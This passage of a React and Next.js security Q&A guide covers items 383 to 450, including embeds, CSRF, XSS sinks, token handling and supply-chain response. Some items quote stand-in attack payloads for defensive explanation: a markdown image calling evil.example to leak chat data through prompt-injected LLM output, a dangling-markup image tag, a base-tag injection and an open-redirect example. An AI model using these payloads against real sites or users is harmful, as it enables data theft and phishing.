- Limit images to your own image proxy or domain to avoid tracking pixels and mixed content.
- Limit input size on the server and in the editor.
- If you also render to HTML on the server (emails, RSS), sanitize that output with DOMPurify.
- Add tests with XSS payloads in markdown.

## 383: A partner wants to embed part of your React app in their site. How do you do it securely?

- Create a separate embed route or app with only the needed features.
- Allow framing only from the partner's origins with `frame-ancestors`; keep the rest of the app `'none'`.
- Decide on auth: a scoped, short-lived token for the embed, or cookies with `SameSite=None; Secure; Partitioned` plus CSRF protection.
- Talk to the parent page with `postMessage`, with exact origin checks and validated message shapes.
- Don't trust the parent page for any decision; it controls its own page.
- Don't allow sensitive actions inside the embed without a full-page confirmation.

## 384: Should an internal admin panel live in the same React SPA as the customer app?

It can, but separating them is safer:

- In the same SPA, admin code and API routes are in public chunks, and any XSS in customer features runs in the same origin as the admin's session.
- A separate app on its own domain (or subdomain with its own cookies) can be protected by SSO, VPN or IP rules at the network level, has a smaller attack surface, and its sessions are isolated.

Either way, every admin API must check admin permissions on the server.

## 385: You find out a dependency you use was published with malicious code yesterday. What do you do?

1. Check if the bad version is in your lockfile, and in which branches and deploys.
2. If it is: stop deploys, pin the safe version, and rebuild from a clean environment.
3. Find out what the malicious code did (advisories, analysis by security vendors): install-time scripts stealing env vars, or runtime code in the bundle.
4. Rotate any secrets that could have been exposed on developer machines and in CI (npm tokens, cloud keys, GitHub tokens).
5. If it shipped to users, assess the impact and notify them as needed.
6. Improve controls: install scripts off, minimum release age, monitoring of lockfile changes.

## 386: Users randomly get logged out after you enabled refresh token rotation. What is likely going on?

Most likely, two requests or tabs used the same refresh token at once. The first one rotated it; the second one looked like token reuse, so the provider revoked the whole token family. Fixes: make refresh single-flight within a tab (a shared promise), coordinate across tabs with Web Locks or `BroadcastChannel`, share the new token between tabs, and configure the provider's reuse grace period if available. Also check that retries after network errors don't reuse old tokens.

## 387: How do you keep tenants isolated in a multi-tenant React app?

- Get the tenant from the authenticated session on the server, never from a request parameter the user can change.
- Scope every query by tenant in the data layer, or use row-level security in the database.
- Include the tenant in all cache keys, both server and client (TanStack Query keys).
- Clear client caches when switching tenants, like on logout.
- Check uploads, exports and background jobs for tenant scoping too.
- Test with two tenants that have the same resource IDs.

## 388: How would you design a secure "log in as user" feature for support staff?

- Only specific roles can start it, ideally with step-up auth (like MFA again).
- The server creates a separate impersonation session that records both the real staff member and the target user.
- The UI shows a clear banner during impersonation.
- Some actions are blocked (changing password, payment details, deleting the account).
- Sessions are short and logged with every action for auditing.
- The target user can be notified, depending on your policy.

Never implement it by letting the client change a `userId` value.

## 389: How do you secure file download links in a React app?

- Generate short-lived signed URLs on the server after checking permission (for example S3 presigned URLs that expire in minutes).
- Don't use public, guessable URLs for private files.
- Set `Content-Disposition: attachment` and the correct `Content-Type` so files download instead of rendering as HTML in your origin.
- Serve user files from a separate domain.
- Don't log full signed URLs in analytics.

## 390: How do you handle sensitive data in an offline-capable PWA?

Data stored in IndexedDB or Cache Storage stays on the device unencrypted, can be read by any script on the origin, and survives until cleared. For sensitive data:

- Store as little as possible, and only what offline use really needs.
- Clear it on logout, and on session expiry.
- Encrypting with Web Crypto helps only if the key isn't stored next to the data (for example derived from a passphrase or a server-held key), which hurts usability.
- Don't cache authenticated API responses in the service worker by default.
- Check that the device-level security (screen lock, disk encryption) fits your risk.

## 391: What security issues come with micro frontends?

- All remote modules run in the same page and origin with full access, so a compromised remote team or CDN can take over the whole app.
- Shared auth state: if each micro frontend gets the token, more code can leak it.
- Different teams may load different, outdated libraries with known bugs.
- CSP is harder because remotes load from several domains.

Mitigations: load remotes only from domains you control, use SRI or signed manifests where possible, share auth through one small shell API instead of passing tokens, keep shared dependency versions in sync and run security checks in every team's pipeline.

## 392: A CDN cached an SSR page with one user's account details and served it to others. How do you prevent this?

- Send `Cache-Control: private, no-store` on all personalized pages and API responses.
- Configure the CDN to bypass the cache when auth cookies are present, and never ignore `Set-Cookie` or `Cache-Control` headers.
- Separate public and private routes clearly (for example public marketing pages vs. `/app/*`).
- Use `Vary` correctly if responses depend on headers.
- Add tests that request a personalized page twice with different users and compare.
- Purge the CDN cache immediately after an incident.

## 393: An attacker calls your Next.js Server Action directly with curl. What protects you?

Only what you wrote inside the action. The framework gives you POST-only and origin checks, which help against CSRF but not against a direct call with the attacker's own valid cookie or with no cookie. So the action must:

- Check the session and return an error if missing.
- Check permission for the specific resource.
- Validate and limit every input with a schema.
- Rate limit expensive or sensitive actions.
- Return only safe, minimal data.

## 394: How should a React app handle a user-controlled theme with custom colors?

Don't accept raw CSS. Accept specific values and validate them:

```ts
const Theme = z.object({
  primary: z.string().regex(/^#[0-9a-fA-F]{6}$/),
  radius: z.enum(["none", "small", "large"]),
});
```

Apply them through CSS variables on a wrapper:

```jsx
<div
  style={{ "--primary": theme.primary }}
  className={`radius-${theme.radius}`}
>
  ...
</div>
```

Validate on the server when saving, and again when rendering, since old data might not match current rules.

## 395: What are the risks of a form builder that renders UI from a server-provided JSON schema?

If admins or users can define forms, the schema can become an attack path: labels with HTML, help text with links, default values, redirect URLs after submit, or field names like `role` that map to sensitive data. Render labels and help text as text, validate URLs, use a fixed set of field types and components, and on submit validate against the schema on the server, mapping fields only to allowed storage.

## 396: How do you safely render AI or LLM output in a React app?

Treat model output as untrusted user input, because prompt injection can make the model output anything:

- Render markdown with a safe renderer (no raw HTML, sanitize if needed).
- Validate links and show the real domain; consider not auto-linking.
- Block or proxy images, because markdown images like `![](https://evil.example/?data=...)` can leak conversation data to attackers when they load.
- Never `eval` generated code in the main page; run it in a sandboxed iframe or worker if you must.
- Never let model output trigger actions (like API calls) without user confirmation and server-side permission checks.

## 397: How do you build link previews in a chat app securely?

- Fetch preview metadata on the server, not in the browser, so users' IPs aren't sent to arbitrary sites.
- Protect that server fetcher from SSRF: block private IP ranges, cloud metadata addresses, and redirects to them.
- Limit response size and time.
- Render titles and descriptions as text, and proxy preview images through your own image service.
- Validate and display the destination URL clearly to reduce phishing.

## 398: What is login CSRF and how do you prevent it?

Login CSRF is when an attacker makes the victim's browser log in to your site with the attacker's account. The victim then saves data (like a credit card or search history) into the attacker's account. Prevent it with CSRF tokens or `Origin` checks on the login endpoint, `SameSite` cookies, and the OAuth `state` parameter for OAuth-based login. Show the logged-in account clearly in the UI.

## 399: A malicious postinstall script ran in your CI. What could it have accessed and what do you do?

It could read every environment variable and file available to the job: npm tokens, cloud credentials, deploy keys, `GITHUB_TOKEN`, signing keys and source code. It could also change build output.

Response: revoke and rotate all secrets available to that job, check for unknown package publishes or deploys, rebuild artifacts from a clean state, and review logs for outbound connections. Prevention: install with scripts disabled, give jobs only the secrets they need (separate install and deploy jobs), use OIDC short-lived credentials, and limit network egress from CI.

## 400: Sentry source maps exposed internal comments and API routes. How do you change the process?

- Build with hidden source maps (`sourcemap: 'hidden'` or the framework equivalent).
- Upload maps to Sentry with an auth token stored as a CI secret.
- Delete `.map` files before deploying, and add a check that fails the deploy if any `.map` file is in the output.
- Configure the web server to return 404 for `*.map` as a backup.
- Review what internal information appears in client code at all (comments are stripped by minifiers, but route names and strings aren't).

## 401: How would you implement step-up authentication for a sensitive action in React?

When the user tries a sensitive action (change email, payout, delete account), the server checks how recent and how strong their authentication is. If it's not enough, it returns an error like `401` with a reason such as `insufficient_user_authentication`. The React app then starts a re-authentication: a passkey prompt, MFA code or an OIDC login with `max_age=0` or `acr_values`. After success, the server issues a short-lived elevated session, and the app retries the action. The check and the elevated state live on the server.

## 402: How can you detect and limit damage from stolen tokens?

- Keep access tokens short-lived.
- Use refresh token rotation with reuse detection.
- Bind tokens to clients (DPoP) or keep them in a BFF.
- Watch for unusual signals on the server: new country, new device, impossible travel, many requests.
- Allow users and admins to see and revoke sessions.
- Revoke all sessions on password change.
- Log token usage with trace IDs for investigation.

## 403: How would you review a third-party React UI component library before adopting it company-wide?

- Search the source for HTML sinks and `eval`, and check which props accept HTML.
- Check how it handles URLs in links, images and iframes.
- Run it under your strict CSP and Trusted Types in report-only mode.
- Look at maintainers, release activity, security policy and past advisories.
- Check its dependencies and install scripts.
- Check bundle output for network calls or telemetry.
- Decide how you will get security updates, and pin versions.

## 404: How do you share authorization rules between client and server without trusting the client?

Use a library like CASL, or a shared module, to define rules once. The server uses them to enforce access; the client uses the same rules (with the user's abilities sent from the server) only to decide what to show.

```ts
import { AbilityBuilder, createMongoAbility } from "@casl/ability";

export function defineAbilitiesFor(user: { id: string; role: string }) {
  const { can, build } = new AbilityBuilder(createMongoAbility);
  if (user.role === "admin") can("manage", "all");
  else can("update", "Post", { authorId: user.id });
  return build();
}
```

The client copy is for UX; if someone changes it in the browser, the server rules still apply.

## 405: How do you avoid repeating auth lookups in Server Components while staying secure?

Wrap the session lookup in React's `cache()`, so it runs once per request, and call it everywhere you need it instead of passing the user down through props.

```ts
import "server-only";
import { cache } from "react";

export const requireUser = cache(async () => {
  const session = await auth();
  if (!session?.user) redirect("/login");
  return session.user;
});
```

`cache()` is per request on the server, so there is no risk of sharing the result between users. This keeps checks close to the data without performance worries.

## 406: How do you make secure options the default for your team's React code?

- Build `SafeHtml`, `SafeLink`, `ExternalLink` and `safeRedirect` helpers.
- Ban the raw versions with lint rules (`react/no-danger`, custom rules for `window.location` and `target="_blank"`).
- Provide an API client that attaches auth only to your own API and handles 401s.
- Provide a data access layer with built-in auth checks for server code.
- Add PR templates with a short security checklist.
- Document why each helper exists, with examples.

## 407: How would you design a secure environment config pipeline for a React app?

- Keep public config and secrets in separate places by design: client config files or prefixed variables only hold public values.
- Store secrets in the platform's secret store or a secrets manager, available only to server functions.
- Validate config at build and start time with a schema (for example `@t3-oss/env` or Zod), failing if a client variable looks like a secret.
- Scan the build output for secret patterns before deploy.
- Use different keys per environment, and never give preview builds production secrets.

## 408: How does React 19 treat javascript: URLs in form action and formAction props?

React 19 checks these props like `href`. A `javascript:` string in `<form action>` or `<button formAction>` is replaced with a URL that throws, so submitting doesn't run the code. In React 19, `action` and `formAction` can also be functions (actions), which React handles itself. The risk remains with forms rendered from user HTML through `dangerouslySetInnerHTML`, which React doesn't check.

## 409: Why are iframe srcDoc and src props risky with user input?

`srcDoc` is an HTML sink: it renders a full HTML document. Without a `sandbox` attribute, scripts in it run in an origin that can reach your page through `parent`. `src` with a user URL can load phishing pages inside your UI, or `data:` and `blob:` documents with scripts. Sanitize `srcDoc` content and always add `sandbox`, and validate `src` against an allowlist of domains.

## 410: Can SVG elements in React be used for XSS?

Rendering SVG with JSX is safe like other elements, but some SVG features take URLs: `<a href>` inside SVG, `<use href>` and `<image href>`. A `javascript:` URL in an SVG link is a risk; React 19 handles `href` the same way for SVG links, but validate user URLs anyway. The bigger risk is inserting user SVG markup with `dangerouslySetInnerHTML`, where `<script>`, `onload` and `<foreignObject>` can run code. Use `<img>` for user SVGs or sanitize with DOMPurify's SVG profile.

## 411: What is base tag injection and how does CSP help?

If an attacker can inject a `<base href="https://evil.example/">` tag (for example through sanitized HTML that allowed it), all relative URLs on the page, including scripts loaded with relative paths, may resolve to the attacker's server. CSP `base-uri 'none'` (or `'self'`) blocks this. DOMPurify removes `<base>` by default; make sure your allowlists don't add it back.

## 412: What is dangling markup injection?

When scripts are blocked by CSP, an attacker who can inject HTML might add an unclosed tag like `<img src='https://evil.example/?` so the browser treats the following page content, up to the next quote, as part of the URL and sends it to the attacker. This can leak CSRF tokens or private data. Defenses: sanitize HTML properly (DOMPurify parses and rebuilds valid markup), restrict `img-src` in CSP, and keep secrets out of the HTML near injection points. Chrome also blocks some URLs that contain both `<` and newlines.

## 413: What is DOM clobbering and how does it affect sanitized HTML?

Elements with `id` or `name` attributes create global variables and document properties. Sanitized HTML like `<img id="config">` or `<form name="getElementById">` can override `window.config` or document methods that your code or libraries read, leading to unexpected behavior or XSS. DOMPurify has `SANITIZE_DOM` (on by default) to block clobbering of built-in properties, and `SANITIZE_NAMED_PROPS` to prefix `id` and `name` values. Also avoid reading globals like `window.someConfig` that HTML could define.

## 414: How can lookalike Unicode characters in URLs trick users?

Attackers use characters that look like Latin letters (Cyrillic "а" instead of "a") to create domains like `pаypal.com`, or right-to-left override characters to change how a filename or URL looks. Browsers show punycode for many suspicious domains in the address bar, but your UI might not. When showing user-provided links, show the parsed hostname (`new URL(href).hostname` returns the punycode form), and warn users when leaving your site for unknown domains.

## 415: Why is localStorage shared between apps on the same origin a problem?

Storage is per origin, not per path. If `example.com/app1` and `example.com/app2` are different apps, they can read each other's localStorage, IndexedDB and non-path cookies, and an XSS in either app affects both. A legacy app or a user-content path on the same origin becomes a risk for your main app. Host separate apps on separate subdomains (or better, separate sites for untrusted content).

## 416: What is cookie tossing from a compromised subdomain?

A page on `sub.example.com` can set a cookie with `Domain=example.com`, which the browser then sends to `app.example.com`. An attacker who controls any subdomain (an old marketing site, a hijacked DNS record) can set a session cookie or CSRF cookie that your app reads, for example to fix a session to the attacker's account or to defeat a naive double-submit check. Use the `__Host-` prefix for important cookies, sign CSRF tokens and clean up unused DNS records.

## 417: How can XSS persist through a service worker, and how do you clean up?

If an attacker gets script execution, they may register a service worker on your origin (if they can host a script file there, for example via uploads served from your origin). The worker can intercept future requests even after the bug is fixed. Defenses: serve uploads from another domain, restrict `worker-src` in CSP, and as cleanup, send `Clear-Site-Data: "storage"` or deploy a kill-switch service worker that unregisters itself.

## 418: What does the Clear-Site-Data header do and when would you use it?

It tells the browser to delete data for your origin: cookies, storage (localStorage, IndexedDB, service workers), cache, or all of them.

```
Clear-Site-Data: "cache", "cookies", "storage"
```

Send it on the logout response for high-security apps, so nothing from the session stays in the browser, or during incident response to clear bad service workers and cached data. It only works over HTTPS. Note that clearing cookies logs the user out of everything on that origin.

## 419: Why might a user see private data after logout by pressing the back button?

Browsers keep recent pages in the back/forward cache (bfcache) or HTTP cache. After logout, pressing back can show the previous page from memory with private data, even though the session is gone. Fixes: send `Cache-Control: no-store` on private pages (which also opts out of bfcache in many cases), listen for the `pageshow` event with `event.persisted` and re-check auth, and clear in-memory state on logout with a full reload.

## 420: How can link prefetching cause security or privacy problems?

Frameworks prefetch routes and sometimes data when links are visible or hovered. This can send requests for protected pages a user isn't allowed to see (wasting server work, creating confusing logs), trigger GET endpoints that have side effects (like `/logout` or `/approve?id=1`), and load data the user never opened. Never make GET requests change state, disable prefetch for sensitive or side-effect links, and make sure prefetched data still goes through auth checks.

## 421: How can a React Router loader create an open redirect?

```ts
export async function loader({ request }) {
  const next = new URL(request.url).searchParams.get("next");
  if (await isLoggedIn(request)) throw redirect(next ?? "/"); // open redirect
  return null;
}
```

`redirect()` accepts absolute URLs, so `?next=https://evil.example` sends users away. Validate first:

```ts
const target =
  next &&
  next.startsWith("/") &&
  !next.startsWith("//") &&
  !next.startsWith("/\\")
    ? next
    : "/";
throw redirect(target);
```

Parsing with `new URL(next, request.url)` and comparing origins is even more robust.

## 422: Why is checking auth in useEffect a weak guard?

`useEffect` runs after the first render is committed, so the protected component renders once (and may start data fetching) before the redirect happens. Users may see a flash of private UI, and child components' effects can fire API calls first. Check auth before rendering: with a loading state, a loader, middleware or server-side check. And again, data must be protected by the API, so this is about UX and avoiding leaks of already-fetched data.

## 423: Why can parallel data fetching in Next.js run before an auth redirect?

In the App Router, layouts and pages for a route can render in parallel, and each Server Component can start fetching data on its own. If the auth check and redirect are in the layout, the page may already be querying the database. If those queries don't check auth themselves, data might be fetched (and in some cases streamed) for unauthenticated users. That is why the recommendation is to check auth inside each data access function, not rely on a single parent check.

## 424: How do you balance per-request security checks with performance?

- Cache the session lookup per request with `cache()`, not across requests.
- Use short-lived signed sessions or JWTs to avoid a database call per request, accepting slower revocation, or keep a fast revocation list in Redis.
- Batch permission checks for lists (load all allowed IDs once).
- Put coarse checks at the edge (proxy) and fine checks in the data layer.
- Cache public data aggressively, and private data never in shared caches.

Security checks are rarely the real bottleneck; measure before removing them.

## 425: How do you rate limit Server Actions or route handlers?

Next.js has no built-in rate limiter. Use a shared store like Redis (for example with Upstash's rate limit library) keyed by user ID, or by IP for anonymous actions, and check it at the top of the action.

```ts
"use server";

export async function sendInvite(email: string) {
  const user = await requireUser();
  const { success } = await ratelimit.limit(`invite:${user.id}`);
  if (!success) return { error: "Too many invites. Try again later." };
  // ...
}
```

Also use platform or WAF rate limits for basic flood protection.

## 426: When does it make sense to use Web Crypto in a React app?

Good uses: generating random values (`crypto.getRandomValues`, `crypto.randomUUID`), PKCE hashing, end-to-end encryption where the server must not see the data, verifying signatures of data from a trusted source, and creating non-extractable keys (DPoP, WebAuthn-related flows). Bad uses: "encrypting" data with a key in the bundle, hashing passwords on the client instead of on the server, or any custom crypto design not reviewed by experts.

## 427: How do you store encryption keys in the browser for an end-to-end encrypted app?

Create keys with Web Crypto as non-extractable `CryptoKey` objects and store them in IndexedDB. IndexedDB can store `CryptoKey` objects directly, and non-extractable keys can be used for encrypt or decrypt but cannot be exported as raw bytes, even by XSS.

```js
const key = await crypto.subtle.generateKey(
  { name: "AES-GCM", length: 256 },
  false, // not extractable
  ["encrypt", "decrypt"],
);
```

XSS can still use the key while the page is open. For recovery across devices, wrap the key with a key derived from the user's passphrase.

## 428: How do passkeys (WebAuthn) improve security in React apps?

Passkeys replace passwords with public-key credentials stored on the user's device or password manager. They are phishing-resistant, because the browser only uses a passkey on the domain it was created for, and nothing reusable is sent to the server. In React, you call `navigator.credentials.create()` and `navigator.credentials.get()` (often through a library like SimpleWebAuthn) with options from your server, and the server verifies the result. They are also great for step-up auth.

## 429: Why are client-side feature flags not a security control?

Flags evaluated in the browser are just values the user can change in DevTools or by editing responses. Flag configs sent to the client may also list unreleased features or customer names. Use flags to control UI, but enforce access to new features on the server, and evaluate sensitive flags server side so the client only gets the result for that user.

## 430: How can analytics leak personal data or tokens?

Analytics tools record page URLs, titles and sometimes click text. If URLs contain emails, reset tokens, search terms or IDs, they end up in a third-party system. Fixes: keep sensitive data out of URLs (use POST bodies or state), strip query params before sending page views, set `Referrer-Policy`, mask text in heatmaps and replays, and review what each tool collects.

## 431: How do attackers find hidden routes and APIs in a React app?

They download the main bundle and chunks, search for strings like `/api/`, `admin`, `internal`, and read route configs and source maps. They also look at the network tab, `robots.txt`, sitemap files and old JavaScript versions cached on CDNs. You can't hide this information, so every route and API must be secure even if its URL is known.

## 432: How do you set security headers on common hosting platforms for React apps?

Each platform has a config file. For example, on Netlify use `_headers` or `netlify.toml`; on Vercel use `vercel.json` or `next.config.js` `headers()`; on AWS use CloudFront response headers policies; with nginx use `add_header`.

```jsonc
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin",
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload",
        },
      ],
    },
  ],
}
```

Check the result with `curl -I` after each deploy.

## 433: How do you deal with noisy CSP violation reports at scale?

Reports come from browser extensions, injected ad scripts, old cached pages and bots, so raw volume is noisy. Filter by `source-file` and `blocked-uri` (ignore `chrome-extension://`, `moz-extension://` and similar), group by directive and blocked URL, sample if traffic is high, and alert on new patterns or on violations from your own scripts. Use a service or a small endpoint with rate limiting so reports can't flood your logs.

## 434: Your JavaScript bundle on the CDN was changed by an attacker. How do you respond?

1. Replace the files with a known-good build and purge the CDN cache.
2. Rotate the credentials that allowed the change (CDN, storage bucket, CI deploy keys).
3. Figure out the time window and what the injected code did (skimming forms, stealing tokens).
4. Invalidate user sessions and tokens if they might be stolen, and notify affected users as required.
5. Prevent: restrict who and what can write to the bucket, enable versioning and change alerts, use SRI from your HTML for CDN assets, and sign or verify build artifacts.

## 435: How do you keep React and Next.js patched without slowing the team down?

- Subscribe to the React blog, Next.js security advisories and GitHub advisories for your dependencies.
- Use Dependabot or Renovate with auto-merge for patch versions that pass tests.
- Keep test coverage good enough to trust patch updates.
- Stay on supported major versions; old ones stop getting fixes.
- Have a documented "emergency patch" path that can ship to production the same day for critical issues like React2Shell.

## 436: Why is "React is safe from XSS" a misleading statement?

React prevents the most common case, putting strings into HTML, by escaping JSX. But XSS in React apps still happens through `dangerouslySetInnerHTML`, URL props, refs, third-party libraries, markdown, SSR state serialization, user-controlled props, and DOM APIs like `window.location`. Plus, framework bugs like React2Shell show that server-side React code needs patching like any server. React makes XSS less likely, not impossible.

## 437: How would you define a "security definition of done" for React features?

A feature is done when:

- User input is rendered safely (no new HTML sinks without review).
- URLs and redirects from users are validated.
- Every new API, route handler or Server Action checks auth, permissions and input.
- No new secrets or sensitive data reach the client, logs or analytics.
- New dependencies were reviewed.
- Error states show safe messages.
- Tests include at least one negative security case (wrong user, bad input).
- CSP still passes without new exceptions, or exceptions are approved.

## 438: How do you protect against XSS in error messages shown by React?

Error messages can contain user input (like "User '<script>' not found"). Rendering `{error.message}` in JSX is safe, but some toast or modal libraries render messages as HTML. Also, URL parameters like `?error=` that you display are a common phishing trick, even as text ("Your account is locked, call 555-..."). Show only messages your app chose, mapped from error codes, instead of displaying raw messages from URLs or APIs.

## 439: How do you secure a React Native app differently from a React web app?

Many ideas are the same (no secrets in the bundle, server-side checks), but storage and transport differ. Use Keychain or Keystore (for example `expo-secure-store` or `react-native-keychain`) for tokens instead of AsyncStorage; use the system browser with PKCE for OAuth (`expo-auth-session`, `react-native-app-auth`); handle deep links carefully because other apps can open them; consider certificate pinning for high-risk apps; and remember app bundles can be decompiled just like web bundles.

## 440: How do you handle CSRF when you use route handlers in Next.js with cookies?

Route handlers (`app/api/.../route.ts`) don't get the Server Action origin check. If they use cookie auth and change data, add your own protection: require a non-GET method, check that the `Origin` header matches your app, use `SameSite=Lax` or `Strict` cookies, and for sensitive actions require a CSRF token or custom header.

```ts
export async function POST(req: Request) {
  const origin = req.headers.get("origin");
  if (origin !== "https://app.example.com")
    return new Response("Forbidden", { status: 403 });
  // ...
}
```

## 441: What risks come with Next.js image optimization or other proxy endpoints?

Endpoints that fetch URLs for you (image optimizers, link previews, PDF generators) can be abused for SSRF to reach internal services, to use your server as a free proxy, or to cause high costs. In Next.js, configure `images.remotePatterns` narrowly instead of allowing all hosts. For your own proxy endpoints, use domain allowlists, block private IPs, and limit size, time and rate.

## 442: How do you prevent ReDoS in client-side and server-side validation?

Some regular expressions take exponential time on certain inputs (for example nested quantifiers like `(a+)+$`). On the client this freezes the tab; on the server (SSR, Server Actions) it can block the event loop for everyone. Use simple, tested patterns, limit input length before running regex, prefer well-known validators (like Zod's built-in email or URL checks), and use linters that detect unsafe regex.

## 443: How do you secure WebSocket or SSE-based real-time features in SSR React apps?

- Authenticate the connection on the server using the same session as HTTP (cookie or short-lived ticket).
- Check `Origin` during the handshake to prevent cross-site WebSocket hijacking.
- Authorize each subscription (room, document, channel) on the server, not by trusting the channel name the client sends.
- Validate every incoming message and limit message size and rate.
- Re-check authorization when permissions change or the session expires, and close connections on logout.

## 444: How do you test an auth flow for common weaknesses before release?

Check that:

- Login uses PKCE and validates `state`.
- Redirect URIs are exact.
- Tokens are not in URLs or logs.
- Logout ends the identity provider session and revokes refresh tokens.
- Old refresh tokens fail after rotation.
- Expired sessions return 401 and the UI recovers.
- Users can't access another tenant by changing IDs.
- Rate limits apply to login, MFA and reset endpoints.
- Reset tokens are single-use and expire.

Automate the API parts with Playwright or integration tests.

## 445: How do you handle security for a React app that runs inside a WebView in a mobile app?

The web app now shares a context with native code. Risks: JavaScript bridges (like `postMessage` to native or exposed native functions) can be called by any script in the WebView, including XSS; the WebView might load arbitrary URLs. Restrict navigation to your domains, validate every bridge message on the native side, expose minimal native functions, use a strict CSP in the web app, and don't pass long-lived tokens into the WebView if the native app can call APIs itself.

## 446: How do you prevent sensitive data from being indexed or cached by search engines and browsers?

- Never put private pages in sitemaps, and protect them with auth (`robots.txt` is not security).
- Send `Cache-Control: no-store` and `X-Robots-Tag: noindex` on private pages and API responses.
- Don't include private data in Open Graph meta tags, which link-preview bots read.
- Make sure private files in object storage aren't public.
- Use `autocomplete="off"` on fields like one-time card verification codes where browsers shouldn't store values.

## 447: How do you approach security in a React app that uses GraphQL?

- Authorize at the resolver or data layer, not in the client query.
- Disable introspection in production if your schema isn't public, knowing it is not real protection.
- Limit query depth, complexity and batching to prevent denial of service.
- Use persisted queries (allowlisted operations) for first-party apps.
- Don't return fields the user shouldn't see just because the client didn't ask for them; make field-level access rules.
- Clear Apollo or urql caches on logout.

## 448: What security questions would you ask before adding a new auth library to a React project?

- Which OAuth flows does it use (code with PKCE)?
- Where does it store tokens, and can you configure it?
- Does it support refresh token rotation and work without third-party cookies?
- How does it handle logout and session expiry?
- Is it maintained, with a security policy and quick fixes?
- Does it support your framework's server side (SSR, RSC, Server Actions)?
- What does it send to the client in the session?

## 449: How do you explain to a product manager why a security fix delays a feature?

Explain in terms of risk and impact, not tools. For example: "Without this, any user can see other customers' invoices by changing the URL. That would be a data breach we'd have to report, and it could cost us customers." Give options: ship with the fix a few days later, ship a smaller version without the risky part, or ship behind a flag to internal users only. Most product people accept a delay when they understand what can go wrong.

## 450: What are the most important habits for building secure React apps?

- Render data as text; treat every HTML, URL and DOM sink as a review point.
- Never trust the client: enforce auth, permissions and validation on the server.
- Keep secrets and private data out of the browser, the bundle and the RSC payload.
- Prefer httpOnly cookies or a BFF over tokens in storage.
- Use CSP, security headers and SameSite cookies as extra layers.
- Treat dependencies and third-party scripts as code you run, and patch fast.
- Show safe errors and log details on the server.
- Test security cases the same way you test features.
